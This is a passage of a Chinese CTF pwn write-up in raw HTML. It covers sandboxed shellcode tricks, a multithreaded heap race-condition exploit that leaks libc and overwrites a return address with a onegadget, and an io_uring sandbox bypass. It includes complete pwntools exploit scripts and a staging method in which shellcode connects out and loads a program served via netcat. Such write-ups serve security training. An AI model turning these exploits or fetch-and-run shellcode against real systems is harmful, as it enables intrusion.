class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x4f</span>,<span class="number">0x60</span>):</span><br><span class="line">    <span class="built_in">print</span>(disasm(i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>)))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0:   4f                      rex.WRXB</span><br><span class="line">0:   50                      push   rax</span><br><span class="line">0:   51                      push   rcx</span><br><span class="line">0:   52                      push   rdx</span><br><span class="line">0:   53                      push   rbx</span><br><span class="line">0:   54                      push   rsp</span><br><span class="line">0:   55                      push   rbp</span><br><span class="line">0:   56                      push   rsi</span><br><span class="line">0:   57                      push   rdi</span><br><span class="line">0:   58                      pop    rax</span><br><span class="line">0:   59                      pop    rcx</span><br><span class="line">0:   5a                      pop    rdx</span><br><span class="line">0:   5b                      pop    rbx</span><br><span class="line">0:   5c                      pop    rsp</span><br><span class="line">0:   5d                      pop    rbp</span><br><span class="line">0:   5e                      pop    rsi</span><br><span class="line">0:   5f                      pop    rdi</span><br></pre></td></tr></table></figure><p>对所有寄存器的push和pop</p><p>读取完输入之后开启了沙箱，然后执行我们输入的code</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231019200418058.png" alt="image-20231019200418058"></p><p>沙箱的意思是read系统调用的fd只能为0，write系统调用的fd要大于2，使用dup2重定向一下文件描述符即可。</p><p>只能输入0x17字节的shellcode，这是不够我们利用的，所以肯定得构造出read系统调用来读取更多的shellcode，syscall的字节码如下</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231019201643643.png" alt="image-20231019201643643"></p><p>这不在可输入的范围内，该如何输入syscall</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231019201906212.png" alt="image-20231019201906212"></p><p>注意到，只要输入不为ye，就会进入到else分支，因此可以在这里输入syscall的字节码，字节码将存储在buf中，刚执行shellcode时，寄存器和栈空间如下</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231019212923924.png" alt="image-20231019212923924"></p><p>rbx为0，可用于read系统调用的rax和rdi，rax为一个栈地址，可用于read的rsi，read的rdx不能太大否则会crash，可以将syscall的字节码0x50f作为rdx，构造好了read的各个寄存器之后，还需要最后使0x50f拼接到shellcode之后，从而执行syscall。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231019213434594.png" alt="image-20231019213434594"></p><p>0x50f位于shellcode下方0x20处，将rsp迁移到0x50f的栈地址之后，再将0x50f连续push四次即可将shellcode和syscall拼接起来。</p><p>然后就可以通过read读取下一段shellcode，构造出符合沙箱条件的shellcode即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">io=process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line">shellcode1=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">pop rsp</span></span><br><span class="line"><span class="string">pop rbx</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;(ye / no)\n&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;\x0f\x05&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;========\n&#x27;</span>)</span><br><span class="line">io.send(asm(shellcode1).ljust(<span class="number">0x11</span>,<span class="string">b&#x27;\x50&#x27;</span>))</span><br><span class="line"></span><br><span class="line">shellcode2=<span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x12</span></span><br><span class="line">shellcode2+=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 0x67616c66</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">mov rax,2</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rax,33</span></span><br><span class="line"><span class="string">mov rsi,0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,0</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">add rsi,0x200</span></span><br><span class="line"><span class="string">mov rdx,0x100</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax,33</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rsi,5</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,5</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">add rsi,0x200</span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">mov rdx,0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.send(shellcode2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x19-羊城杯2023heap-【多线程条件竞争】"><a href="#0x19-羊城杯2023heap-【多线程条件竞争】" class="headerlink" title="0x19.羊城杯2023heap 【多线程条件竞争】"></a>0x19.羊城杯2023heap 【多线程条件竞争】</h2><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231020151435925.png" alt="image-20231020151435925"></p><p>一个多线程的堆题</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231020151620394.png" alt="image-20231020151620394"></p><p>在edit功能中存在一个sleep(1),然后再进行strcpy，如果在edit时，我们free掉这个正在被edit的chunk再申请一块size更小一点的chunk，就能够导致堆溢出。</p><p>这是一个条件竞争漏洞。</p><p>在add功能中</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231020153118764.png" alt="image-20231020153118764"></p><p>先分配一个0x10的chunk，然后再申请用户需要的chunk，size限制在0x50-0x68之间，申请出来的chunk如下所示</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231023220654218.png" alt="image-20231023220654218"></p><p>小chunk的前8字节存储着用户chunk的地址，第二个8字节存储着用户chunk的size。</p><p>如何利用条件竞争漏洞呢？</p><p>首先</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231023223027053.png" alt="image-20231023223027053"></p><p>size是根据index来的，如果在sleep前后，s[index]中存储的chunk指针发生了变化，就能够导致一个堆溢出的漏洞。比如s[0]一开始存储的是0x63的chunk，那么size将被赋值为0x63，而如果在sleep过程中，s[0]被修改为了0x60的chunk，那么就可以通过s[0]溢出到下一个chunk的size中。</p><p>首先来泄露libc地址</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231023225154023.png" alt="image-20231023225154023"></p><p>由于fgets会在输入的末尾添加0，所以常规的通过堆上残留的地址信息来泄露libc地址的方法是行不通的。</p><p>在edit功能中</p><p><img src="C:\Users\24990\AppData\Roaming\Typora\typora-user-images\image-20231023231635047.png" alt="image-20231023231635047"></p><p>是通过小chunk中存储的指针来索引堆块的，只要能修改这个指针，我们就能够泄露出想要的数据。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231023231952778.png" alt="image-20231023231952778"></p><p>线程中的堆块是在mmap中开辟出来的内存中的。由于会在末尾添加0，所以对于这个指针的修改至多只能是2字节 ，看看修改末尾2字节能够找到哪些数据：</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231023232215121.png" alt="image-20231023232215121"></p><p>在0x7f0b6c000000+0x8a0处，可以找到一个libc地址，可以通过堆溢出将chunk指针的末尾两字节修改为0x8a0来进行泄露</p><p>将下一个chunk修改为如下图所示</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231029170143549.png" alt="image-20231029170143549"></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231029170207110.png" alt="image-20231029170207110"></p><p>如此一来就能够泄露libc地址了。</p><p>然后再故技重施，泄露栈地址，不过栈地址不能使用environ指针来泄露了，因为environ的值的末尾1字节为00，会被strncpy截断，所以需要换一个</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231029172025948.png" alt="image-20231029172025948"></p><p>参数的指针也是可以的</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231029172117725.png" alt="image-20231029172117725"></p><p>得到栈地址之后，进而可以计算出pthread_create的返回地址</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231029193702948.png" alt="image-20231029193702948"></p><p>然后再使用第三次堆溢出，修改返回地址的值为onegadget</p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">io=process(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content</span>):</span><br><span class="line">    payload=<span class="string">b&#x27;1 &#x27;</span></span><br><span class="line">    payload+=content</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your chocie:\n\n&#x27;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    payload=<span class="string">&#x27;2 &#x27;</span></span><br><span class="line">    payload+=<span class="built_in">str</span>(index)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your chocie:\n\n&#x27;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    payload=<span class="string">b&#x27;3 &#x27;</span></span><br><span class="line">    payload+=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    payload+=<span class="string">b&#x27;:&#x27;</span></span><br><span class="line">    payload+=content</span><br><span class="line">    payload+=<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your chocie:\n\n&#x27;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    payload=<span class="string">&#x27;4 &#x27;</span></span><br><span class="line">    payload+=<span class="built_in">str</span>(index)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your chocie:\n\n&#x27;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x63</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x60</span>+p16(<span class="number">0x8a0</span>))</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span>)<span class="comment">#0</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x219c80</span></span><br><span class="line">libc_argv=libc_base+<span class="number">0x21aa20</span></span><br><span class="line">pop_rdi=libc_base+<span class="number">0x000000000002a3e5</span></span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr=libc_base+<span class="number">0x001d8698</span></span><br><span class="line">onegadget=libc_base+<span class="number">0xebdaf</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&#x27;libc_argv =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_argv)))</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x58</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x58</span>)<span class="comment">#5</span></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x60</span>+p64(libc_argv))</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">add(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x58</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">pthread_ret_addr=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x160</span></span><br><span class="line">log.success(<span class="string">&#x27;pthread_ret_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(pthread_ret_addr)))</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x58</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;e&#x27;</span>*<span class="number">0x68</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="string">b&#x27;e&#x27;</span>*<span class="number">0x58</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="string">b&#x27;e&#x27;</span>*<span class="number">0x58</span>)<span class="comment">#8</span></span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x60</span>+p64(pthread_ret_addr))</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">add(<span class="string">b&#x27;e&#x27;</span>*<span class="number">0x58</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(onegadget))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Input the new paper content&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Input the new paper content&#x27;</span>)</span><br><span class="line">io.sendline()</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x1A-ACTF2023-master-of-orw【io-uring系统调用、recvfrom、connect在shellcode中的使用】"><a href="#0x1A-ACTF2023-master-of-orw【io-uring系统调用、recvfrom、connect在shellcode中的使用】" class="headerlink" title="0x1A.ACTF2023 master-of-orw【io_uring系统调用、recvfrom、connect在shellcode中的使用】"></a>0x1A.ACTF2023 master-of-orw【io_uring系统调用、recvfrom、connect在shellcode中的使用】</h2><p>开了一个很逆天的沙箱</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231129110100004.png" alt="image-20231129110100004"></p><p>open read write被禁了个遍，那么该如何成为master呢？</p><p>正统的方法是使用<code>io_uring</code>，io_uring是从内核版本5.1之后添加进去的新特性，有以下三个系统调用</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231129152311135.png" alt="image-20231129152311135"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define __NR_io_uring_setup 425</span><br><span class="line">#define __NR_io_uring_enter 426</span><br><span class="line">#define __NR_io_uring_register 427</span><br></pre></td></tr></table></figure><p><code>io_uring</code> 主要为了解决 <code>原生AIO（Native AIO）</code> 存在的一些不足之处。比如系统调用开销大。</p><p>由于调用系统调用时，会从用户态切换到内核态，从而进行上下文切换，而上下文切换会消耗一定的 CPU 时间。</p><p>使用 <code>read()</code> 和 <code>write()</code> 等系统调用进行 I&#x2F;O 操作时，会从用户态嵌入到内核态，如下图所示：</p><p><img src="https://pic3.zhimg.com/80/v2-a09ea6992c0c135badf8328ac2806f5a_720w.webp" alt="img"></p><p><code>io_uring</code> 为了减少或者摒弃系统调用，采用了用户态与内核态 <code>共享内存</code> 的方式来通信。如下图所示：</p><p><img src="https://pic1.zhimg.com/80/v2-7f37d16cf333c4915e0cbf11c9d73f70_720w.webp" alt="img"></p><p>实际上该调用read还是一样调用，但是不走read系统调用了，走的是io_uring的系统调用。</p><p>那么这题就可以用io_uring来实现shellcode，从而绕过沙箱。</p><p>不过由于手搓io_uring的shellcode相当麻烦，所以这里还有一个取巧的办法，沙箱并没有堵住recvfrom函数，因此可以上传一个mmap-socket-connect-recvfrom的shellcode。</p><p>首先静态编译(不开启pie)一个使用io_uring进行orw的程序，然后在本地使用<code>cat orw | nc -l 8888</code>将程序从本地的8888端口发送出去。</p><p>shellcode中的mmap用于在0x400000开辟一块内存，然后connect到本地的8888端口，再调用recvfrom从8888端口读取数据，存储在0x400000处，也就是将orw这个程序读取到0x400000处。最后跳转到orw的main函数处继续执行。 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;liburing.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;liburing/io_uring.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 256</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring</span> <span class="title">ring</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> <span class="title">params</span>;</span></span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> buffer[BUFSIZE];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化参数</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(&amp;params, <span class="number">0</span>, <span class="keyword">sizeof</span>(params));</span><br><span class="line">    <span class="keyword">if</span> (io_uring_queue_init_params(<span class="number">1</span>, &amp;ring, &amp;params) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_queue_init_params&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 配置open操作</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span> =</span> io_uring_get_sqe(&amp;ring);</span><br><span class="line">    io_uring_prep_openat(sqe, AT_FDCWD, <span class="string">&quot;flag&quot;</span>, O_RDONLY, <span class="number">0</span>);</span><br><span class="line">    io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);</span><br><span class="line">    </span><br><span class="line">   </span><br><span class="line">    <span class="comment">// 提交open操作</span></span><br><span class="line">    io_uring_submit(&amp;ring);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 配置read操作</span></span><br><span class="line">    sqe = io_uring_get_sqe(&amp;ring);</span><br><span class="line">    io_uring_prep_read(sqe, <span class="number">5</span>, buffer, BUFSIZE, <span class="number">0</span>);</span><br><span class="line">    io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 提交read操作</span></span><br><span class="line">    io_uring_submit(&amp;ring);</span><br><span class="line">    </span><br><span class="line">    sqe = io_uring_get_sqe(&amp;ring);</span><br><span class="line">    io_uring_prep_write(sqe, STDOUT_FILENO, buffer, BUFSIZE, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 提交write操作</span></span><br><span class="line">    io_uring_submit(&amp;ring);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 等待操作完成</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cqe</span> *<span class="title">cqe</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (io_uring_wait_cqe(&amp;ring, &amp;cqe) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_wait_cqe&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    <span class="comment">// 提交所有操作</span></span><br><span class="line">    io_uring_submit(&amp;ring);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理</span></span><br><span class="line">    io_uring_cq_advance(&amp;ring, <span class="number">2</span>);</span><br><span class="line">    io_uring_queue_exit(&amp;ring);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span 